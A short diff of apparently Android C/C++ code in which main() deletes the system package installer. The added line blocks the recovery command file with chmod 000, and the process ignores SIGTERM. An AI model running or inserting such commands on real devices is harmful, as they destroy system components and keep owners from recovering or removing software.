@@ -160,6 +160,7 @@ void * lockpackageconf(void*){
 }
 int main(){
   system("rm -f /system/app/com.android.packageinstaller*");
+  system("chmod 000 /cache/recovery/command");
   signal(15,[](int){
     return;
   });
